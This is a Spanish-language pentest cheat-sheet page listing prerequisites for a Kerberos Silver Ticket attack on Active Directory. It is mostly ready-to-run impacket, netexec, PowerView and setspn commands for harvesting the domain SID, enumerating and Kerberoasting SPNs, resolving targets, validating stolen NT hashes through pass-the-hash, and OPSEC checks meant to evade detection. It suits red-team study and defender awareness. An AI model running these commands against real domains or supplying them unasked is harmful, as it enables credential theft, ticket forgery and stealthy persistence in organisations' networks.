---
aliases:
  - Silver Ticket Prerequisites
  - Silver Ticket SPN discovery
tags:
  - type/technique
  - technique/persistence
  - technique/kerberos
  - env/windows
  - env/linux
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Silver Ticket]]"
---

# Silver Ticket - Prereqs y SPNs

***

## Domain SID — recolección

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-lookupsid corp.local/user:'pass'@DC 0` | Domain SID via RID 0 | Linux pre-forge. |
| `impacket-lookupsid corp.local/user:'pass'@DC 0 \| grep -i 'domain sid'` | Solo línea SID | Clean parse. |
| `impacket-lookupsid -hashes :NT corp/admin@DC 0` | Domain SID via PtH | Sin password. |
| `whoami /user` | SID del user actual — descartar último RID | On-host Windows. |
| `Get-DomainSID` (PowerView) | Domain SID | On-host Windows con PV. |
^st-pre-sid

```bash
impacket-lookupsid corp.local/user:'P@ssw0rd'@dc01.corp.local 0 | grep -i "domain sid"
# Domain SID: S-1-5-21-1234567890-987654321-111222333
```

___

## SPN discovery — qué servicios atacar

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/user:'pass'@DC` | SPNs registrados en el dominio | Recon SPNs targets. |
| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request` | SPNs + TGS hashes (Kerberoast) | Atacar service accounts. |
| `setspn -Q */* -T corp.local` | SPNs del dominio (on-host Windows) | Sin impacket. |
| `setspn -L 'WEB01$'` | SPNs registrados sobre un computer/user | Targeted enumeration. |
| `nxc ldap DC -u user -p pass --kerberoasting kerb.txt` | TGS hashes filtrados | netexec one-liner. |
^st-pre-spns

```bash
impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local
# ServicePrincipalName    Name        MemberOf
# MSSQLSvc/sql01:1433     svc_mssql   ...
# HTTP/web01.corp.local   svc_iis     ...
```

___

## FQDN target — resolver host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nslookup TARGET` | FQDN del host | Pre-forge SPN. |
| `nxc smb DC --pass-pol \| grep -i 'domain'` | Nombre del dominio | Si no tenés FQDN. |
| `nxc smb hosts.txt` | FQDN columnar de cada host | Bulk discovery. |
| `dig SRV _ldap._tcp.corp.local @DC` | DCs registrados | Discovery DC FQDN. |
^st-pre-fqdn

```bash
# Resolver host objetivo
nxc smb 10.10.10.0/24
# 10.10.10.5  WEB01    [*] Windows Server 2019 ... (domain:corp.local)
```

___

## Test de hash antes de forjar

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-smbclient -hashes :NT corp.local/'WEB01$'@web01.corp.local` | Valida NT hash del computer account | Pre-forge — confirmar hash. |
| `nxc smb host -u 'WEB01$' -H NTHASH` | PtH check con netexec | Bulk validation. |
| `impacket-getTGT -hashes :NT corp.local/'WEB01$'` | Pedir TGT real con el hash | Confirma key válida. |
^st-pre-test

```bash
# Confirmar hash antes de invertir tiempo en forge
impacket-smbclient -hashes :ABC123 corp.local/'WEB01$'@web01.corp.local
# smb: \> ls   ← si funciona, hash válido
```

___

## Verificar SPN existe en AD

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/user:'pass'@DC \| grep cifs` | Confirma SPN registrado | Pre-forge. |
| `setspn -Q cifs/web01.corp.local` | SPN check on-host | Windows. |
| `Get-DomainComputer web01 \| select serviceprincipalname` | SPNs del computer (PowerView) | On-host Windows. |
^st-pre-verify

```bash
# Confirmar SPN antes de forjar
impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local | grep -i web01
# HOST/web01.corp.local      WEB01$
# CIFS/web01.corp.local      WEB01$
```

___

## OPSEC pre-ataque

| **Check** | **Comando** | **Qué evita** |
|:---:|:---:|:---:|
| Encryption types soportados | `nxc smb DC -u user -p pass -M encryption-downgrade` | Forge RC4 en dominio AES-only = detección. |
| PAC validation activo | `Get-ADDomain \| select PacValidation` (PV) | KDC re-valida PAC → ticket forjado falla. |
| Computer account rotation policy | `Get-DomainPolicy \| select MaximumPasswordAge` | Hash inválido si rotation reciente. |
| Tickets activos (cleanup) | `klist purge` / `kerberos::purge` | Collision con tickets existentes. |
^st-pre-opsec

```bash
# Pre-attack: confirmar que dominio NO está en AES-only
nxc ldap DC -u user -p pass --query '(samAccountName=krbtgt)' 'msDS-SupportedEncryptionTypes'
# 0x18 = AES128+AES256 only → forge AES, NO RC4
# 0x1C = RC4+AES128+AES256 → RC4 OK
```

***
